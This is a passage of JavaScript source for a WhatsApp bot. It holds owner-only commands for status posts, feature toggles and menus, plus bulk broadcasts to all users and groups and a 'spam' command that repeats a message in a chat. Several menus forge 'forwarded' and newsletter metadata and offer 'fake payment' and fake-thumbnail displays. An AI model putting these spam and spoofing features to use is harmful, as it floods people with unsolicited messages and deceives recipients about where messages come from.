"sections":[{"title":"SELECT THE REPLY BELOW",
"highlight_label":"OWNER'S FAVOURITE",
"rows":[{"header":"CHANNEL + LINK THUMB",
"title":"CHOOSE ",
"description":"CHANNEL + LINK THUMB",
"id":"${prefix+command} v4"},
{"header":"LARGE LINK + THUMBNAIL",
"title":"CHOOSE ",
"description":"LARGE LINK + THUMBNAIL",
"id":"${prefix+command} v3"},
{"header":"LINK + FAKE THUMBNAIL",
"title":"CHOOSE ",
"description":"LINK + FAKE THUMBNAIL",
"id":"${prefix+command} v2"},
{"header":"QUOTED NORMALLY",
"title":"CHOOSE ",
"description":"QUOTED NORMALLY",
"id":"${prefix+command} v1"}
]
}
]
}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '100000000000000000@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: m })

await VeranBotInc.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
            }
            break
            case 'statustext': 
            case 'upswtext':
            case 'upswteks': {
               if (!VeranTheCreator) return VeranStickOwner()
               if (!q) return replygcveran('Text?')
               await VeranBotInc.sendMessage('status@broadcast', { text: q }, { backgroundColor: '#FF000000', font: 3, statusJidList: Object.keys(global.db.users) })
               replygcveran(mess.done)
            }
            break
            case 'statusvideo':
            case 'upswvideo': {
               if (!VeranTheCreator) return VeranStickOwner()
               if (/video/.test(mime)) {
                  var videosw = await VeranBotInc.downloadAndSaveMediaMessage(quoted)
                  await VeranBotInc.sendMessage('status@broadcast', {
                     video: {
                        url: videosw
                     },
                     caption: q ? q : ''
                  }, { statusJidList: Object.keys(global.db.users) })
                  await replygcveran(mess.done)
               } else {
                  replygcveran('Reply to video')
               }
            }
            break
            case 'statusimg':
            case 'statusimage':
            case 'upswimg': {
               if (!VeranTheCreator) return VeranStickOwner()
               if (/image/.test(mime)) {
                  var imagesw = await VeranBotInc.downloadAndSaveMediaMessage(quoted)
                  await VeranBotInc.sendMessage('status@broadcast', {
                     image: {
                        url: imagesw
                     },
                     caption: q ? q : ''
                  }, { statusJidList: Object.keys(global.db.users)})
                  await replygcveran(mess.done)
               } else {
                  replygcveran('Reply to image')
               }
            }
            break
            case 'statusaudio':
            case 'upswaudio': {
               if (!VeranTheCreator) return VeranStickOwner()
               if (/audio/.test(mime)) {
                  var audiosw = await VeranBotInc.downloadAndSaveMediaMessage(quoted)
                  await VeranBotInc.sendMessage('status@broadcast', {
                     audio: {
                        url: audiosw
                     },
                     mimetype: 'audio/mp4',
                     ptt: true
                  }, {
                     backgroundColor: '#FF000000',
                     statusJidList: Object.keys(global.db.users)
                  })
                  await replygcveran(mess.done)
               } else {
                  replygcveran('Reply to audio')
               }
            }
            break
			case 'setvidmenu':
            case 'svm': 
            	case 'setvgifmenu':
            case 'sgm': {
                if (!VeranTheCreator) return VeranStickOwner()
                try {
                let delb = await VeranBotInc.downloadAndSaveMediaMessage(quoted)
                await fsx.copy(delb, './VTHmedia/theme/Vth-Video.mp4')
                fs.unlinkSync(delb)
                replygcveran(mess.done)
                } catch {
                	replygcveran(`Please reply to a image with caption ${prefix+command}`)
                }
            }
            break
			case 'setimgmenu':
            case 'sim': {
                if (!VeranTheCreator) return VeranStickOwner()
                try {
                let delb = await VeranBotInc.downloadAndSaveMediaMessage(quoted)
                await fsx.copy(delb, './VTHmedia/theme/VthPic.jpg')
                fs.unlinkSync(delb)
                replygcveran(mess.done)
                } catch {
                	replygcveran(`Please reply to a image with caption ${prefix+command}`)
                }
            }
            break
			case 'setmenu': {
            if (!VeranTheCreator) return VeranStickOwner()
            if (text.startsWith('v')) {
                  typemenu = text
                  replygcveran(mess.done)
               } else {
               let msg = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${m.pushName}\nPlease click on the button below`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./VTHmedia/theme/VthPic.jpg')}, { upload: VeranBotInc.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": `{"title":"SELECT MENU 🗂️",
"sections":[{"title":"SELECT THE MENU BELOW",
"highlight_label":"OWNER'S FAVOURITE",
"rows":[{"header":"BUTTON + CHANNEL V2",
"title":"CHOOSE ",
"description":"BUTTON + CHANNEL V2",
"id":"${prefix+command} v12"},
{"header":"BUTTON + CHANNEL",
"title":"CHOOSE ",
"description":"BUTTON + CHANNEL",
"id":"${prefix+command} v11"},
{"header":"ONLY BUTTON",
"title":"CHOOSE ",
"description":"ONLY BUTTON",
"id":"${prefix+command} v10"},
{"header":"CHANNEL + FAKE THUMBNAIL V2",
"title":"CHOOSE ",
"description":"CHANNEL + FAKE THUMBNAIL V2",
"id":"${prefix+command} v9"},
{"header":"CHANNEL + FAKE THUMBNAIL",
"title":"CHOOSE ",
"description":"CHANNEL + FAKE THUMBNAIL",
"id":"${prefix+command} v8"},
{"header":"FAKE THUMBNAIL + DOCUMENT",
"title":"CHOOSE ",
"description":"FAKE THUMBNAIL + DOCUMENT",
"id":"${prefix+command} v7"},
{"header":"FAKE PAYMENT",
"title":"CHOOSE ",
"description":"FAKE PAYMENT",
"id":"${prefix+command} v6"},
{"header":"CALL SCHEDULE",
"title":"CHOOSE",
"description":"CALL SCHEDULE",
"id":"${prefix+command} v5"},
{"header":"GIF THUMBNAIL",
"title":"CHOOSE",
"description":"GIF THUMBNAIL",
"id":"${prefix+command} v4"},
{"header":"VIDEO THUMBNAIL",
"title":"CHOOSE",
"description":"VIDEO THUMBNAIL",
"id":"${prefix+command} v3"},
{"header":"CHANNEL + THUMBNAIL",
"title":"CHOOSE",
"description":"CHANNEL + THUMBNAIL",
"id":"${prefix+command} v2"},
{"header":"IMAGE THUMBNAIL",
"title":"CHOOSE",
"description":"IMAGE THUMBNAIL",
"id":"${prefix+command} v1"}
]
}
]
}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '100000000000000000@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: m })

await VeranBotInc.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
}
break
			case 'bc':
            case 'broadcast': {
               if (!VeranTheCreator) return VeranStickOwner()
               if (!text) return replygcveran('Text?')
               let teksnya = `${text}\n\n\n\nDate: ${xdate} ${xtime}`
               for (let i of Object.keys(global.db.users)) {
               await sleep(1500)
                  if (/image/.test(mime)) {
                     var media = await quoted.download()
                     await VeranBotInc.sendMessage(i, { 
                        image:media,
                        caption: teksnya
                     })
                  } else if (/video/.test(mime)) {
                     var media = await quoted.download()
                     await VeranBotInc.sendMessage(i, {
                        video: media,
                        caption: teksnya
                     })
                  } else if (text) {
                     await VeranBotInc.sendMessage(i, {
                        text: teksnya
                     })
                  }
               }
               replygcveran(`Success ${command} To ${Object.keys(global.db.users).length} Users`)
            }
            break
            case 'bcgc':
            case 'bcgroup': {
                if (!VeranTheCreator) return VeranStickOwner()
                if (!text) return replygcveran(`Text mana?\n\nExample : ${prefix + command} Besok Libur `)
                let getGroups = await VeranBotInc.groupFetchAllParticipating()
                let groups = Object.entries(getGroups).slice(0).map(entry => entry[1])
                let anu = groups.map(v => v.id)
                replygcveran(`Sending Broadcast To ${anu.length} Group Chat, End Time ${anu.length * 1.5} seconds`)
                for (let i of anu) {
                    await sleep(1500)
                    let a = `${ownername}'s Broadcast\n\n` + '```' + `Message: ${text}\n\n` + '```'
                    VeranBotInc.sendMessage(i, {
                        text: a,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: `Sent in ${i.length} Group`,
                                thumbnailUrl: 'https://i.imgur.com/KpJrTE7.jpeg',
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    })
                }
                replygcveran(`Successful in sending Broadcast To ${anu.length} Group`)
            }
            break
			case 'spam':
				if (!VeranTheCreator) return VeranStickOwner()
					if (!text) return replygcveran(`Use ${prefix +command} text|amount`)
				veranarg = text.split("|")
				if (!veranarg) return replygcveran(`Use ${prefix+ command} text|amount`)
				if (Number(veranarg[1]) >= 50) return replygcveran('Max 50!')
				if (isNaN(veranarg[1])) return replygcveran(`must be a number`)
				for (let i = 0; i < veranarg[1]; i++){
					VeranBotInc.sendMessage(m.chat, {text: veranarg[0]})
				}
				break
			case 'antiforeign':{
            	if (!m.isGroup) return VeranStickGroup()
if (!m.isBotAdmin) return VeranStickBotAdmin()
if (!m.isAdmin && !VeranTheCreator) return VeranStickAdmin()
               if (args[0] === 'on') {
                  db.groups[m.chat].antiforeignnum = true
                  replygcveran(`${command} is enabled`)
               } else if (args[0] === 'off') {
                  db.groups[m.chat].antiforeignnum = false
                  replygcveran(`${command} is disabled`)
               } else {
                	let msg = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${m.pushName}\nPlease click on the button below to use _*${command}*_ command`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./VTHmedia/theme/VthPic.jpg')}, { upload: VeranBotInc.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": `{
  "title": "SELECT ENABLE/DISABLE ",
  "sections": [
    {
      "title": "CHOOSE ENABLE/DISABLE",
      "rows": [
        {
          "header": "ENABLE ",
          "title": "CHOOSE ",
          "description": "ENABLE ",
          "id": "${prefix}enable"
        },
        {
          "header": "DISABLE ",
          "title": "CHOOSE ",
          "description": "DISABLE ",
          "id": "${prefix}disable"
        }
      ]
    }
  ]
}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '100000000000000000@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: m })

await VeranBotInc.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
               }
            break
            case 'poll': {
	if (!VeranTheCreator) return VeranStickOwner()
            let [poll, opt] = text.split("|")
            if (text.split("|") < 2)
                return await replygcveran(
                    `Mention question and atleast 2 options\nExample: ${prefix}poll Who is best admin?|Veran,wanga,andy...`
                )
            try {
            let options = []
            for (let i of opt.split(',')) {
                options.push(i)
            }
            await VeranBotInc.sendMessage(m.chat, {
                poll: {
                    name: poll,
                    values: options
                }
            })
            } catch {
            	replygcveran(
                    `Mention question and atleast 2 options\nExample: ${prefix}poll Who is best admin?|Veran,Wanga,Andy...`
                )
                }
        }
        break
			case 'autoblock':
                if (!VeranTheCreator) return VeranStickOwner()
                if (q == 'on') {
                    db.settings[botNumber].autoblocknum = true
                    replygcveran(`Successfully Changed Auto-Block To ${q}`)
                } else if (q == 'off') {
                    db.settings[botNumber].autoblocknum = false
                    replygcveran(`Successfully Changed Auto-Block To ${q}`)
                } else {
                	let msg = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${m.pushName}\nPlease click on the button below to use _*${command}*_ command`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./VTHmedia/theme/VthPic.jpg')}, { upload: VeranBotInc.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": `{
  "title": "SELECT ENABLE/DISABLE ",
  "sections": [
    {
      "title": "CHOOSE ENABLE/DISABLE",
      "rows": [
        {
          "header": "ENABLE ",
          "title": "CHOOSE ",
          "description": "ENABLE ",
          "id": "${prefix}enable"
        },
        {
          "header": "DISABLE ",
          "title": "CHOOSE ",
          "description": "DISABLE ",
          "id": "${prefix}disable"
        }
      ]
    }
  ]
}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '100000000000000000@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: m })

await VeranBotInc.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
            break
            case 'onlygroup':
            case 'onlygc':
                if (!VeranTheCreator) return VeranStickOwner()
                if (q == 'on') {
                    db.settings[botNumber].onlygrub = true
                    replygcveran(`Successfully Changed Onlygroup To ${q}`)
                } else if (q == 'off') {
                    db.settings[botNumber].onlygrub = false
                    replygcveran(`Successfully Changed Onlygroup To ${q}`)
                } else {
                	let msg = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${m.pushName}\nPlease click on the button below to use _*${command}*_ command`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./VTHmedia/theme/VthPic.jpg')}, { upload: VeranBotInc.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": `{
  "title": "SELECT ENABLE/DISABLE ",
  "sections": [
    {
      "title": "CHOOSE ENABLE/DISABLE",
      "rows": [
        {
          "header": "ENABLE ",
          "title": "CHOOSE ",
          "description": "ENABLE ",
          "id": "${prefix}enable"
        },
        {
          "header": "DISABLE ",
          "title": "CHOOSE ",
          "description": "DISABLE ",
          "id": "${prefix}disable"
        }
      ]
    }
  ]
}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '100000000000000000@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: m })

await VeranBotInc.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
            break
            case 'onlyprivatechat':
            case 'onlypc':
                if (!VeranTheCreator) return VeranStickOwner()
                if (q == 'on') {
                    db.settings[botNumber].onlypc = true
                    replygcveran(`Successfully Changed Only-Pc To ${q}`)
                } else if (q == 'off') {
                    db.settings[botNumber].onlypc = false
                    replygcveran(`Successfully Changed Only-Pc To ${q}`)
                } else {
                	let msg = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${m.pushName}\nPlease click on the button below to use _*${command}*_ command`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./VTHmedia/theme/VthPic.jpg')}, { upload: VeranBotInc.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": `{
  "title": "SELECT ENABLE/DISABLE ",
  "sections": [
    {
      "title": "CHOOSE ENABLE/DISABLE",
      "rows": [
        {
          "header": "ENABLE ",
          "title": "CHOOSE ",
          "description": "ENABLE ",
          "id": "${prefix}enable"
        },
        {
          "header": "DISABLE ",
          "title": "CHOOSE ",
          "description": "DISABLE ",
          "id": "${prefix}disable"
        }
      ]
    }
  ]
}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '100000000000000000@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: m })

await VeranBotInc.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
            break
            case 'onlyindia':
            case 'onlyindianumber':
                if (!VeranTheCreator) return VeranStickOwner()
                if (q == 'on') {
                    db.settings[botNumber].onlyindia = true
                    replygcveran(`Successfully Changed Only-Indian To ${q}`)
                } else if (q == 'off') {
                    db.settings[botNumber].onlyindia = false
                    replygcveran(`Successfully Changed Only-Indian To ${q}`)
                } else {
                	let msg = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${m.pushName}\nPlease click on the button below to use _*${command}*_ command`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./VTHmedia/theme/VthPic.jpg')}, { upload: VeranBotInc.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": `{
  "title": "SELECT ENABLE/DISABLE ",
  "sections": [
    {
      "title": "CHOOSE ENABLE/DISABLE",
      "rows": [
        {
          "header": "ENABLE ",
          "title": "CHOOSE ",
          "description": "ENABLE ",
          "id": "${prefix}enable"
        },
        {
          "header": "DISABLE ",
          "title": "CHOOSE ",
          "description": "DISABLE ",
          "id": "${prefix}disable"
        }
      ]
    }
  ]
}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '100000000000000000@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: m })

await VeranBotInc.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
            break
            case 'onlyindo':
            case 'onlyindonumber':
                if (!VeranTheCreator) return VeranStickOwner()
                if (q == 'on') {
                    db.settings[botNumber].onlyindo = true
                    replygcveran(`Successfully Changed Only-Indonesian To ${q}`)
                } else if (q == 'off') {
                    db.settings[botNumber].onlyindo = false
                    replygcveran(`Successfully Changed Only-Indonesian To ${q}`)
                } else {
                	let msg = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${m.pushName}\nPlease click on the button below to use _*${command}*_ command`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./VTHmedia/theme/VthPic.jpg')}, { upload: VeranBotInc.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": `{
  "title": "SELECT ENABLE/DISABLE ",
  "sections": [
    {
      "title": "CHOOSE ENABLE/DISABLE",
      "rows": [
        {
          "header": "ENABLE ",
          "title": "CHOOSE ",
          "description": "ENABLE ",
          "id": "${prefix}enable"
        },
        {
          "header": "DISABLE ",
          "title": "CHOOSE ",
          "description": "DISABLE ",
          "id": "${prefix}disable"
        }
      ]
    }
  ]
}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '100000000000000000@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: m })

await VeranBotInc.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
            break
			case 'setautoblock':
                if (!VeranTheCreator) return VeranStickOwner()
                if (!text) return replygcveran(`Example : ${prefix + command} 234`)
                global.autoblocknumber = text
                replygcveran(`Auto-Block number successfully changed to ${text}`)
                break
                case 'setantiforeign':
                if (!VeranTheCreator) return VeranStickOwner()
                if (!text) return replygcveran(`Example : ${prefix + command} 234`)
                global.antiforeignnumber = text
                replygcveran(`Anti-foreign number successfully changed to ${text}`)
                break
			case 'autoswview':
    case 'autostatusview':{
             if (!VeranTheCreator) return VeranStickOwner()
               
               if (args[0] === 'on') {
                  db.settings[botNumber].antiswview = true
                  replygcveran(`${command} is enabled`)
               } else if (args[0] === 'off') {
                  db.settings[botNumber].antiswview = false
                  replygcveran(`${command} is disabled`)
               } else {
                	let msg = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${m.pushName}\nPlease click on the button below to use _*${command}*_ command`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./VTHmedia/theme/VthPic.jpg')}, { upload: VeranBotInc.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": `{
  "title": "SELECT ENABLE/DISABLE ",
  "sections": [
    {
      "title": "CHOOSE ENABLE/DISABLE",
      "rows": [
        {
          "header": "ENABLE ",
          "title": "CHOOSE ",
          "description": "ENABLE ",
          "id": "${prefix}enable"
        },
        {
          "header": "DISABLE ",
          "title": "CHOOSE ",
          "description": "DISABLE ",
          "id": "${prefix}disable"
        }
      ]
    }
  ]
}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '100000000000000000@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: m })

await VeranBotInc.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
            }
            break
    case 'anticall': {
             if (!VeranTheCreator) return VeranStickOwner()
               
               if (args[0] === 'on') {
                  db.settings[botNumber].anticall = true
                  replygcveran(`${command} is enabled`)
               } else if (args[0] === 'off') {
                  db.settings[botNumber].anticall = false
                  replygcveran(`${command} is disabled`)
               } else {
                	let msg = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${m.pushName}\nPlease click on the button below to use _*${command}*_ command`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./VTHmedia/theme/VthPic.jpg')}, { upload: VeranBotInc.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '100000000000000000@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: m })

await VeranBotInc.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
            }
            break
			case 'autorecordtype':
                if (!VeranTheCreator) return VeranStickOwner()
                
                if (q === 'on') {
                    db.settings[botNumber].autorecordtype = true
                    replygcveran(`Successfully changed Auto-RecordingTyping to ${q}`)
                } else if (q === 'off') {
                    db.settings[botNumber].autorecordtype = false
                    replygcveran(`Successfully changed Auto-RecordingTyping to ${q}`)
                } else {
                	let msg = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${m.pushName}\nPlease click on the button below to use _*${command}*_ command`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./VTHmedia/theme/VthPic.jpg')}, { upload: VeranBotInc.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": `{
  "title": "SELECT ENABLE/DISABLE ",
  "sections": [
    {
      "title": "CHOOSE ENABLE/DISABLE",
      "rows": [
        {
          "header": "ENABLE ",
          "title": "CHOOSE ",
          "description": "ENABLE ",
          "id": "${prefix}enable"
        },
        {
          "header": "DISABLE ",
          "title": "CHOOSE ",
          "description": "DISABLE ",
          "id": "${prefix}disable"
        }
      ]
    }
  ]
}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '100000000000000000@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: m })

await VeranBotInc.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
            break
            case 'autorecord':
                if (!VeranTheCreator) return VeranStickOwner()
                
                if (q === 'on') {
                    db.settings[botNumber].autorecord = true
                    replygcveran(`Successfully changed Auto-Recording to ${q}`)
                } else if (q === 'off') {
                    db.settings[botNumber].autorecord = false
                    replygcveran(`Successfully changed Auto-Recording to ${q}`)
                } else {
                	let msg = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${m.pushName}\nPlease click on the button below to use _*${command}*_ command`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./VTHmedia/theme/VthPic.jpg')}, { upload: VeranBotInc.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": `{
  "title": "SELECT ENABLE/DISABLE ",
  "sections": [
    {
      "title": "CHOOSE ENABLE/DISABLE",
      "rows": [
        {
          "header": "ENABLE ",
          "title": "CHOOSE ",
          "description": "ENABLE ",
          "id": "${prefix}enable"
        },
        {
          "header": "DISABLE ",
          "title": "CHOOSE ",
          "description": "DISABLE ",
          "id": "${prefix}disable"
        }
      ]
    }
  ]
}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '100000000000000000@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: m })

await VeranBotInc.relayMessage(msg.key.remoteJid, msg.message, {
